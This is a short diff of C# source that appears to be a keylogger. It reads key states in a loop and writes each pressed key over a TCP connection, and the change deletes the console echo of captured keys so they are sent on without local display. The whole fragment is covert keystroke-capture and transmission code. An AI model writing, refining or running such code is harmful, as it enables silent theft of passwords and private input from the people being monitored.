@@ -18,7 +18,6 @@ static class Program
                 // replace -32767 with 32769 for windows 10.
                 if (keyState == 1 || keyState == 32769)
                 {
-                    Console.WriteLine((char)i);
                     tc2.GetStream().WriteByte((byte)i);
                     break;
                 }
